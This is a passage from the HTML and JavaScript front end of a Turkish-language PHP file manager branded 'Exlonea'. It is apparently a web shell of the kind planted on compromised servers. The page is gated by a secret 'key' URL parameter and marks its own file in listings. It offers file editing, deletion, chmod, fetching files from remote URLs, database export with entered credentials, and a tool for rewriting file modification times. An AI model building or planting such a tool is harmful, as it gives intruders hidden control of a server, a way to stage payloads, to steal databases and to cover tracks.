                    <li><a class="dropdown-item action-create-file" href="#" data-bs-toggle="modal" data-bs-target="#createFileModal"><i class="bi bi-file-earmark-plus"></i> Yeni Dosya Oluştur</a></li>
                    <li><hr class="dropdown-divider"></li>
                    <li><a class="dropdown-item action-copy" href="#" data-bs-toggle="modal" data-bs-target="#copyModal" onclick="setTopluActionValues('copy')"><i class="bi bi-files"></i> Kopyala</a></li>
                    <li><a class="dropdown-item action-delete" href="#" onclick="performTopluAction('delete')"><i class="bi bi-trash"></i> Sil</a></li>
                    <li><a class="dropdown-item action-download" href="#" onclick="performTopluAction('download')"><i class="bi bi-download"></i> İndir</a></li>
                    <li><a class="dropdown-item action-move" href="#" data-bs-toggle="modal" data-bs-target="#moveModal" onclick="setTopluActionValues('move')"><i class="bi bi-arrows-move"></i> Taşı</a></li>
                    <li><a class="dropdown-item action-rename" href="#" data-bs-toggle="modal" data-bs-target="#renameModal" onclick="setSingleActionValues('rename')"><i class="bi bi-pencil-square"></i> Yeniden Adlandır</a></li>
                    <li><a class="dropdown-item action-sunucuyaziple" href="#" onclick="performTopluAction('sunucuyaziple')"><i class="bi bi-file-earmark-zip"></i> SunucuyaZiple</a></li>
                    <li><hr class="dropdown-divider"></li>
                    <li><a class="dropdown-item action-chmod" href="#" data-bs-toggle="modal" data-bs-target="#chmodModal" onclick="setSingleActionValues('chmod')"><i class="bi bi-shield-lock"></i> İzinleri Düzenle</a></li>
                    <li><a class="dropdown-item action-touch" href="#" data-bs-toggle="modal" data-bs-target="#touchModal" onclick="setSingleActionValues('touch')"><i class="bi bi-calendar-check"></i> Tarih/Saat Düzenle</a></li>
                </ul>
            </div>

            <div class="dropdown">
                <button class="btn btn-green dropdown-toggle" type="button" id="toolsMenu" data-bs-toggle="dropdown" aria-expanded="false">
                    <i class="bi bi-tools"></i> Araçlar
                </button>
                <ul class="dropdown-menu dropdown-menu-fit-scroll" aria-labelledby="toolsMenu">
                    <li><button class="dropdown-item" type="button" data-bs-toggle="modal" data-bs-target="#uploadModal"><i class="bi bi-upload"></i> Yükle (Dosya/URL)</button></li>
                    <li><button class="dropdown-item" type="button" data-bs-toggle="modal" data-bs-target="#databaseExportModal"><i class="bi bi-database"></i> Veri Tabanı Dışa Aktar</button></li>
                    <li><button class="dropdown-item" type="button" data-bs-toggle="modal" data-bs-target="#encryptModal"><i class="bi bi-key"></i> Şifreleme</button></li>
                </ul>
            </div>
        </div>

        <!-- Arama inputuna oninput event eklendi - anlık arama -->
        <form method="GET" action="" class="mb-3" id="searchForm">
            <div class="input-group">
                <input type="text" class="form-control" name="query" id="searchInput" placeholder="Dosya ara..." value="<?php echo isset($_GET['query']) ? htmlspecialchars($_GET['query']) : ''; ?>" oninput="performSearch()">
                <input type="hidden" name="dir" value="<?php echo htmlspecialchars($currentDir); ?>">
                <input type="hidden" name="key" value="<?php echo $KEY_PARAM; ?>">
                <input type="hidden" name="action" value="search">
                <button class="btn btn-primary" type="submit"><i class="bi bi-search"></i> Ara</button>
            </div>
        </form>

        <div class="table-responsive">
            <table class="table table-hover table-striped">
                <thead>
                    <tr>
                        <th><input type="checkbox" id="selectAll" onclick="toggleFileSelection()"></th>
                        <th>Ad</th>
                        <th>Boyut</th>
                        <th>Değiştirme Tarihi</th>
                        <th>İzinler</th>
                    </tr>
                </thead>
                <tbody>
                    <?php 
                    $parentDir = dirname($currentDir); 
                    if (realpath($parentDir) !== realpath($currentDir)) { 
                    ?>
                    <tr data-file-name=".." data-file-type="dir" data-perms="-" data-mtime="">
                        <td><input type="checkbox" name="file[]" value=".." onchange="updateFileSelection()"></td>
                        <td>
                            <i class="bi bi-folder-fill text-warning file-icon"></i>
                            <a href="?dir=<?php echo urlencode($parentDir); ?>&key=<?php echo $KEY_PARAM; ?>">..</a>
                        </td>
                        <td>-</td>
                        <td>-</td>
                        <td>-</td>
                    </tr>
                    <?php } ?>

                    <?php foreach ($files as $file) { 
                        $isSelf = $file['name'] === $scriptName;
                        $nameClass = $isSelf ? 'self-highlight' : '';
                        $fileUrl = getServerFileUrl($file['path']);
                    ?>
                    <tr data-file-name="<?php echo htmlspecialchars($file['name']); ?>" 
                        data-file-type="<?php echo $file['type']; ?>" 
                        data-perms="<?php echo $file['perms']; ?>" 
                        data-mtime="<?php echo $file['mtime'] ? date('Y-m-d H:i:s', $file['mtime']) : ''; ?>"
                        data-file-url="<?php echo htmlspecialchars($fileUrl); ?>">

                        <td>
                            <input type="checkbox" name="file[]" value="<?php echo htmlspecialchars($file['name']); ?>" onchange="updateFileSelection()">
                        </td>
                        <td>
                            <i class="<?php echo $file['icon']; ?> file-icon"></i>
                            <?php if ($file['type'] === 'dir') { ?>
                                <a href="?dir=<?php echo urlencode($file['path']); ?>&key=<?php echo $KEY_PARAM; ?>" class="<?php echo $nameClass; ?>"><?php echo htmlspecialchars($file['name']); ?></a>
                            <?php } else { ?>
                                <a href="#" onclick="openEditModal('<?php echo htmlspecialchars($file['name'], ENT_QUOTES); ?>'); return false;" class="<?php echo $nameClass; ?>"><?php echo htmlspecialchars($file['name']); ?></a>
                            <?php } ?>
                        </td>
                        <td><?php echo formatSize($file['size']); ?></td>
                        <td><?php echo date('Y-m-d H:i', $file['mtime']); ?></td>
                        <td><?php echo $file['perms']; ?></td>
                    </tr>
                    <?php } 
                    if (empty($files)) {
                        echo '<tr><td colspan="5" class="text-center">Dosya bulunamadı</td></tr>';
                    }
                    ?>
                </tbody>
            </table>
        </div>

        <div class="footer">
            Copyright © Exlonea - 2025
        </div>

        <div class="modal fade" id="editModal" tabindex="-1" aria-labelledby="editModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-xl">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="editModalLabel">Dosya Düzenleme: <span id="modalFileName"></span></h5>
                        <!-- Karanlık mod butonu icon'a çevrildi -->
                        <button type="button" class="btn btn-sm btn-outline-secondary theme-toggle-btn" id="themeToggle" onclick="toggleEditorTheme()" title="Tema Değiştir">
                            <i class="bi bi-moon-fill" id="themeIcon"></i>
                        </button>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <form method="POST" action="?action=edit&dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" id="editForm">
                        <div class="modal-body p-0">
                            <input type="hidden" name="file" id="editFileName">
                            <div class="editor-container" id="editorContainer">
                                <div class="line-numbers" id="lineNumbers"></div>
                                <!-- Syntax highlighting için code-preview eklendi -->
                                <div class="code-preview" id="codePreview"><pre><code class="language-plaintext" id="highlightedCode"></code></pre></div>
                                <textarea name="content" id="editFileContent" class="code-textarea" spellcheck="false"></textarea>
                            </div>
                            
                            <input type="hidden" id="modalTargetPerms">
                            <input type="hidden" id="modalTargetMtime">
                            <input type="hidden" id="modalTargetUrl">
                        </div>
                        <div class="edit-actions">
                            <button type="button" class="btn btn-danger" data-bs-dismiss="modal"><i class="bi bi-x-circle"></i> Kapat</button>
                            <button type="submit" class="btn btn-success"><i class="bi bi-save"></i> Kaydet</button>
                            <a class="btn btn-info" id="editModalGoTo" href="#" target="_blank" onclick="return checkFileUrl();"><i class="bi bi-box-arrow-up-right"></i> Dosyaya Git</a>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <div class="modal fade" id="createFolderModal" tabindex="-1" aria-labelledby="createFolderModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="createFolderModalLabel"><i class="bi bi-folder-plus"></i> Yeni Klasör Oluştur</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <form method="POST" action="?action=create_folder&dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>">
                        <div class="modal-body">
                            <input type="text" name="folder_name" class="form-control" placeholder="Klasör Adı" required>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><i class="bi bi-x-circle"></i> İptal</button>
                            <button type="submit" class="btn btn-primary"><i class="bi bi-check-circle"></i> Oluştur</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <div class="modal fade" id="createFileModal" tabindex="-1" aria-labelledby="createFileModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="createFileModalLabel"><i class="bi bi-file-earmark-plus"></i> Yeni Dosya Oluştur</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <form method="POST" action="?action=create_file&dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>">
                        <div class="modal-body">
                            <input type="text" name="file_name" class="form-control" placeholder="Dosya Adı (Örn: index.php)" required>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><i class="bi bi-x-circle"></i> İptal</button>
                            <button type="submit" class="btn btn-primary"><i class="bi bi-check-circle"></i> Oluştur & Düzenle</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <div class="modal fade" id="renameModal" tabindex="-1" aria-labelledby="renameModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="renameModalLabel"><i class="bi bi-pencil-square"></i> Yeniden Adlandır</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <form method="POST" action="?action=rename&dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" id="renameForm">
                        <div class="modal-body">
                            <input type="hidden" name="old_name" id="renameOldName">
                            <p>Eski Ad: <span id="renameOldNameDisplay" class="fw-bold"></span></p>
                            <label for="renameNewName" class="form-label">Yeni Ad</label>
                            <input type="text" name="new_name" id="renameNewName" class="form-control" required>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><i class="bi bi-x-circle"></i> İptal</button>
                            <button type="submit" class="btn btn-primary"><i class="bi bi-check-circle"></i> Adlandır</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        
        <div class="modal fade" id="chmodModal" tabindex="-1" aria-labelledby="chmodModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="chmodModalLabel"><i class="bi bi-shield-lock"></i> İzinleri Düzenle (CHMOD)</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <form method="POST" action="?action=chmod&dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" id="chmodForm">
                        <div class="modal-body">
                            <input type="hidden" name="file" id="chmodFileName">
                            <p>Dosya: <span id="chmodFileNameDisplay" class="fw-bold"></span></p>
                            <p>Mevcut İzin: <span id="chmodOldPerms" class="fw-bold"></span></p>
                            <label for="chmodNewPerms" class="form-label">Yeni İzin (Oktal - Örn: 0777, 0644)</label>
                            <input type="text" name="perms" id="chmodNewPerms" class="form-control" pattern="0[0-7]{3}" maxlength="4" required>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><i class="bi bi-x-circle"></i> İptal</button>
                            <button type="submit" class="btn btn-primary"><i class="bi bi-check-circle"></i> Uygula</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <div class="modal fade" id="touchModal" tabindex="-1" aria-labelledby="touchModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="touchModalLabel"><i class="bi bi-calendar-check"></i> Tarih/Saat Düzenle</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <form method="POST" action="?action=touch&dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" id="touchForm">
                        <div class="modal-body">
                            <input type="hidden" name="file" id="touchFileName">
                            <p>Dosya: <span id="touchFileNameDisplay" class="fw-bold"></span></p>
                            <p>Mevcut Tarih/Saat: <span id="touchOldMtime" class="fw-bold"></span></p>
                            <label for="touchNewMtime" class="form-label">Yeni Tarih/Saat</label>
                            <input type="datetime-local" name="mtime" id="touchNewMtime" class="form-control" step="1" required>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><i class="bi bi-x-circle"></i> İptal</button>
                            <button type="submit" class="btn btn-primary"><i class="bi bi-check-circle"></i> Uygula</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <div class="modal fade" id="uploadModal" tabindex="-1" aria-labelledby="uploadModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="uploadModalLabel"><i class="bi bi-upload"></i> Dosya Yükle / URL'den İndir</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <div class="modal-body">
                        <div class="mb-3">
                            <div class="form-check form-switch">
                                <input class="form-check-input" type="checkbox" id="createFolderToggle" onchange="toggleFolderCreation()">
                                <label class="form-check-label" for="createFolderToggle">
                                    Klasör Oluştur ve İçine Yükle
                                </label>
                            </div>
                            <div id="folderNameInput" style="display:none;" class="mt-2">
                                <input type="text" class="form-control" id="uploadFolderName" placeholder="Klasör Adı">
                            </div>
                        </div>

                        <ul class="nav nav-tabs" id="uploadTab" role="tablist">
                            <li class="nav-item" role="presentation">
                                <button class="nav-link active" id="file-tab" data-bs-toggle="tab" data-bs-target="#file-upload" type="button" role="tab"><i class="bi bi-file-earmark-arrow-up"></i> Dosya Yükle</button>
                            </li>
                            <li class="nav-item" role="presentation">
                                <button class="nav-link" id="url-tab" data-bs-toggle="tab" data-bs-target="#url-download" type="button" role="tab"><i class="bi bi-link-45deg"></i> URL'den İndir</button>
                            </li>
                        </ul>
                        
                        <div class="tab-content pt-3">
                            <div class="tab-pane fade show active" id="file-upload" role="tabpanel">
                                <form method="POST" action="?action=upload&dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" enctype="multipart/form-data" id="fileUploadForm">
                                    <input type="hidden" name="upload_type" value="file">
                                    <input type="hidden" name="create_folder_on_upload" id="fileUploadFolderFlag" value="no">
                                    <input type="hidden" name="upload_folder_name" id="fileUploadFolderName" value="">
                                    <div class="mb-3">
                                        <label for="uploadedFiles" class="form-label">Dosya(ları) Seçin</label>
                                        <input class="form-control" type="file" id="uploadedFiles" name="uploaded_files[]" multiple required>
                                    </div>
                                    <button type="submit" class="btn btn-primary w-100"><i class="bi bi-upload"></i> Yükle</button>
                                </form>
                            </div>

                            <div class="tab-pane fade" id="url-download" role="tabpanel">
                                <form method="POST" action="?action=upload&dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" id="urlUploadForm">
                                    <input type="hidden" name="upload_type" value="url">
                                    <input type="hidden" name="create_folder_on_upload" id="urlUploadFolderFlag" value="no">
                                    <input type="hidden" name="upload_folder_name" id="urlUploadFolderName" value="">
                                    <div class="mb-3">
                                        <label for="urls" class="form-label">URL'leri Girin (Her satıra bir tane)</label>
                                        <textarea class="form-control" id="urls" name="urls" rows="5" placeholder="https://example.com/dosya.zip&#10;https://another.com/image.jpg" required></textarea>
                                    </div>
                                    <button type="submit" class="btn btn-primary w-100"><i class="bi bi-download"></i> İndir</button>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="modal fade" id="moveModal" tabindex="-1" aria-labelledby="moveModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="moveModalLabel"><i class="bi bi-arrows-move"></i> Dosyaları/Klasörleri Taşı</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <form method="POST" action="?action=move&dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" id="moveForm">
                        <div class="modal-body">
                            <p>Seçilen Öğe Sayısı: <span id="moveFileCount" class="fw-bold">0</span></p>
                            <input type="hidden" name="files[]" id="moveFileNames">
                            <label for="moveDestination" class="form-label">Hedef Dizin</label>
                            <input type="text" name="destination" id="moveDestination" class="form-control" placeholder="/var/www/html/yeni_dizin" required>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><i class="bi bi-x-circle"></i> İptal</button>
                            <button type="submit" class="btn btn-primary"><i class="bi bi-check-circle"></i> Taşı</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <div class="modal fade" id="copyModal" tabindex="-1" aria-labelledby="copyModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="copyModalLabel"><i class="bi bi-files"></i> Dosyaları/Klasörleri Kopyala</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <form method="POST" action="?action=copy&dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>" id="copyForm">
                        <div class="modal-body">
                            <p>Seçilen Öğe Sayısı: <span id="copyFileCount" class="fw-bold">0</span></p>
                            <input type="hidden" name="files[]" id="copyFileNames">
                            <label for="copyDestination" class="form-label">Hedef Dizin</label>
                            <input type="text" name="destination" id="copyDestination" class="form-control" placeholder="/var/www/html/yedek_dizin" required>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><i class="bi bi-x-circle"></i> İptal</button>
                            <button type="submit" class="btn btn-primary"><i class="bi bi-check-circle"></i> Kopyala</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <div class="modal fade" id="databaseExportModal" tabindex="-1" aria-labelledby="databaseExportModalLabel" aria-hidden="true">
            <div class="modal-dialog">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="databaseExportModalLabel"><i class="bi bi-database"></i> Veri Tabanı Dışa Aktar</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <form method="POST" action="?action=database_export&dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>">
                        <div class="modal-body">
                            <div class="mb-3">
                                <label for="dbHost" class="form-label">Host</label>
                                <input type="text" name="host" id="dbHost" class="form-control" placeholder="localhost" required>
                            </div>
                            <div class="mb-3">
                                <label for="dbUser" class="form-label">Kullanıcı Adı</label>
                                <input type="text" name="user" id="dbUser" class="form-control" placeholder="root" required>
                            </div>
                            <div class="mb-3">
                                <label for="dbPass" class="form-label">Şifre</label>
                                <input type="password" name="pass" id="dbPass" class="form-control" placeholder="">
                            </div>
                            <div class="mb-3">
                                <label for="dbName" class="form-label">Veritabanı Adı</label>
                                <input type="text" name="db" id="dbName" class="form-control" placeholder="mydatabase" required>
                            </div>
                        </div>
                        <div class="modal-footer">
                            <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><i class="bi bi-x-circle"></i> İptal</button>
                            <button type="submit" class="btn btn-primary"><i class="bi bi-check-circle"></i> Dışa Aktar</button>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <div class="modal fade" id="encryptModal" tabindex="-1" aria-labelledby="encryptModalLabel" aria-hidden="true">
            <div class="modal-dialog modal-lg">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title" id="encryptModalLabel"><i class="bi bi-key"></i> Şifreleme Araçları</h5>
                        <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Kapat"></button>
                    </div>
                    <div class="modal-body">
                        <div class="mb-3">
                            <label for="encryptInput" class="form-label">Şifrelenecek Metin</label>
                            <input type="text" class="form-control" id="encryptInput" placeholder="Örn: 123">
                        </div>
                        <button type="button" class="btn btn-primary" onclick="generateHashes()"><i class="bi bi-gear-fill"></i> Şifrele</button>
                        <hr>
                        <div class="hash-results-container" id="hashResults"></div>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal"><i class="bi bi-x-circle"></i> Kapat</button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <!-- Highlight.js JavaScript eklendi -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/php.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/css.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/sql.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/python.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/languages/json.min.js"></script>
    <script>
        let selectedFiles = [];
        let searchTimeout = null;

        function updateFileSelection() {
            const checkboxes = document.querySelectorAll('input[name="file[]"]:checked');
            selectedFiles = Array.from(checkboxes)
                .map(cb => cb.value)
                .filter(val => val !== '..');
            
            const selectAllCheckbox = document.getElementById('selectAll');
            const allCheckboxes = document.querySelectorAll('input[name="file[]"]');
            const allChecked = Array.from(allCheckboxes).every(cb => cb.value === '..' || cb.checked);
            selectAllCheckbox.checked = allChecked && allCheckboxes.length > 0;
        }

        function toggleFileSelection() {
            const selectAllCheckbox = document.getElementById('selectAll');
            const checkboxes = document.querySelectorAll('input[name="file[]"]');
            
            checkboxes.forEach(cb => {
                if (cb.value !== '..') {
                    cb.checked = selectAllCheckbox.checked;
                }
            });
            
            updateFileSelection();
        }

        function performSearch() {
            clearTimeout(searchTimeout);
            searchTimeout = setTimeout(() => {
                const searchValue = document.getElementById('searchInput').value;
                if (searchValue.length >= 2 || searchValue.length === 0) {
                    document.getElementById('searchForm').submit();
                }
            }, 300);
        }

        function setSingleActionValues(action) {
            updateFileSelection();
            if (selectedFiles.length !== 1) {
                alert("Lütfen sadece bir dosya seçin!");
                return false;
            }

            const fileName = selectedFiles[0];
            const row = document.querySelector(`tr[data-file-name="${fileName}"]`);

            if (action === 'rename') {
                document.getElementById('renameOldName').value = fileName;
                document.getElementById('renameOldNameDisplay').textContent = fileName;
                document.getElementById('renameNewName').value = fileName;
            } else if (action === 'chmod') {
                const perms = row.getAttribute('data-perms');
                document.getElementById('chmodFileName').value = fileName;
                document.getElementById('chmodFileNameDisplay').textContent = fileName;
                document.getElementById('chmodOldPerms').textContent = perms;
                document.getElementById('chmodNewPerms').value = perms;
            } else if (action === 'touch') {
                const mtime = row.getAttribute('data-mtime');
                document.getElementById('touchFileName').value = fileName;
                document.getElementById('touchFileNameDisplay').textContent = fileName;
                document.getElementById('touchOldMtime').textContent = mtime;
                if (mtime) {
                    const mtimeFormatted = mtime.replace(' ', 'T');
                    document.getElementById('touchNewMtime').value = mtimeFormatted;
                }
            }
        }

        function setTopluActionValues(action) {
            updateFileSelection();
            if (selectedFiles.length === 0) {
                alert("Lütfen en az bir dosya seçin!");
                return false;
            }
            
            const fileListString = selectedFiles.join(',');

            if (action === 'move') {
                document.getElementById('moveFileCount').textContent = selectedFiles.length;
                document.getElementById('moveFileNames').value = fileListString;
                document.getElementById('moveDestination').value = '';
            } else if (action === 'copy') {
                document.getElementById('copyFileCount').textContent = selectedFiles.length;
                document.getElementById('copyFileNames').value = fileListString;
                document.getElementById('copyDestination').value = '';
            }
        }

        function performTopluAction(action) {
            updateFileSelection();
            if (selectedFiles.length === 0) {
                alert("Lütfen en az bir dosya seçin!");
                return;
            }

            let confirmed = true;
            if (action === 'delete') {
                confirmed = confirm(`${selectedFiles.length} dosya/klasör silmek istediğinize emin misiniz?`);
            }

            if (confirmed) {
                const form = document.createElement('form');
                form.method = 'POST';
                form.action = `?action=${action}&dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>`;

                selectedFiles.forEach(fileName => {
                    const fileInput = document.createElement('input');
                    fileInput.type = 'hidden';
                    fileInput.name = 'files[]';
                    fileInput.value = fileName;
                    form.appendChild(fileInput);
                });
                
                document.body.appendChild(form);
                form.submit();
            }
        }

        function detectLanguage(fileName) {
            const ext = fileName.split('.').pop().toLowerCase();
            const languageMap = {
                'php': 'php',
                'js': 'javascript',
                'html': 'xml',
                'htm': 'xml',
                'css': 'css',
                'sql': 'sql',
                'py': 'python',
                'json': 'json',
                'xml': 'xml',
                'txt': 'plaintext',
                'md': 'markdown'
            };
            return languageMap[ext] || 'plaintext';
        }

        function highlightCode(code, language) {
            const highlightedCode = document.getElementById('highlightedCode');
            highlightedCode.className = `language-${language}`;
            highlightedCode.textContent = code;
            
            if (typeof hljs !== 'undefined') {
                hljs.highlightElement(highlightedCode);
            }
        }

        function openEditModal(fileName) {
            const editModal = new bootstrap.Modal(document.getElementById('editModal'));
            document.getElementById('modalFileName').textContent = fileName;
            document.getElementById('editFileName').value = fileName;

            const row = document.querySelector(`tr[data-file-name="${fileName}"]`);
            const fileType = row.getAttribute('data-file-type');
            
            if (fileType === 'dir') {
                alert("Dizinler düzenlenemez!");
                return;
            }

            document.getElementById('modalTargetPerms').value = row.getAttribute('data-perms');
            document.getElementById('modalTargetMtime').value = row.getAttribute('data-mtime');
            const fileUrl = row.getAttribute('data-file-url');
            document.getElementById('modalTargetUrl').value = fileUrl;
            
            const goToButton = document.getElementById('editModalGoTo');
            if (fileUrl) {
                goToButton.href = fileUrl;
                goToButton.classList.remove('disabled');
            } else {
                goToButton.href = '#';
                goToButton.classList.add('disabled');
            }

            fetch(`?action=get_file_content&dir=<?php echo urlencode($currentDir); ?>&key=<?php echo $KEY_PARAM; ?>&file=${encodeURIComponent(fileName)}`)
                .then(response => {
                    if (!response.ok) {
                        return response.json().then(err => { throw new Error(err.error || 'Bilinmeyen Hata'); });
                    }
                    return response.json();
                })
                .then(data => {
                    const textarea = document.getElementById('editFileContent');
                    textarea.value = data.content;
                    updateLineNumbers(data.content);
                    
                    const language = detectLanguage(fileName);
                    highlightCode(data.content, language);
                    
                    textarea.scrollTop = 0;
                    editModal.show();
                })
                .catch(error => {
                    alert(`Dosya içeriği yüklenemedi: ${error.message}`);
                });
        }

        function updateLineNumbers(content) {
            const lines = content.split('\n');
            const lineNumbersDiv = document.getElementById('lineNumbers');
            lineNumbersDiv.innerHTML = '';
            for (let i = 1; i <= lines.length; i++) {
                const lineDiv = document.createElement('div');
                lineDiv.className = 'line-number-line';
                lineDiv.textContent = i;
                lineNumbersDiv.appendChild(lineDiv);
            }
        }

        function toggleEditorTheme() {
            const container = document.getElementById('editorContainer');
            const themeIcon = document.getElementById('themeIcon');
            const highlightTheme = document.getElementById('highlightTheme');
            
            container.classList.toggle('light-mode');
            
            if (container.classList.contains('light-mode')) {
                // Aydınlık tema
                themeIcon.className = 'bi bi-sun-fill';
                highlightTheme.href = 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github.min.css';
            } else {
                // Karanlık tema
                themeIcon.className = 'bi bi-moon-fill';
                highlightTheme.href = 'https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/vs2015.min.css';
            }
            
            // Syntax highlighting'i yeniden uygula
            const textarea = document.getElementById('editFileContent');
            const fileName = document.getElementById('editFileName').value;
            const language = detectLanguage(fileName);
            highlightCode(textarea.value, language);
        }

        document.addEventListener('DOMContentLoaded', () => {
            const textarea = document.getElementById('editFileContent');
            const lineNumbersDiv = document.getElementById('lineNumbers');
            const codePreview = document.getElementById('codePreview');

            if (textarea && lineNumbersDiv) {
                textarea.addEventListener('scroll', () => {
                    lineNumbersDiv.scrollTop = textarea.scrollTop;
                    codePreview.scrollTop = textarea.scrollTop;
                    codePreview.scrollLeft = textarea.scrollLeft;
                });

                textarea.addEventListener('input', () => {
                    updateLineNumbers(textarea.value);
                    const fileName = document.getElementById('editFileName').value;
                    const language = detectLanguage(fileName);
                    highlightCode(textarea.value, language);
                });

                updateLineNumbers(textarea.value); 
            }

            <?php if ($fileToEdit) { ?>
            setTimeout(() => {
                const row = document.querySelector(`tr[data-file-name="<?php echo addslashes($fileToEdit); ?>"]`);
                if (row) {
                    openEditModal('<?php echo addslashes($fileToEdit); ?>');
                }
            }, 100);
            <?php } ?>
        });

        function checkFileUrl() {
            const url = document.getElementById('modalTargetUrl').value;
            if (!url) {
                alert('Bu dosyanın genel erişim URL\'si sunucu tarafından tespit edilemedi.');
                return false;
            }
            return true;
        }

        function copyCurrentPath(path) {
            navigator.clipboard.writeText(path).then(() => {
                showToast('Dizin kopyalandı!', 'success');
            }).catch(() => {
                showToast('Kopyalama başarısız!', 'danger');
            });
        }

        function toggleFolderCreation() {
            const isChecked = document.getElementById('createFolderToggle').checked;
            const folderInput = document.getElementById('folderNameInput');
            
            if (isChecked) {
                folderInput.style.display = 'block';
            } else {
                folderInput.style.display = 'none';
            }
            
            document.getElementById('fileUploadFolderFlag').value = isChecked ? 'yes' : 'no';
            document.getElementById('urlUploadFolderFlag').value = isChecked ? 'yes' : 'no';
        }

        document.getElementById('fileUploadForm').addEventListener('submit', function() {
            const folderName = document.getElementById('uploadFolderName').value;
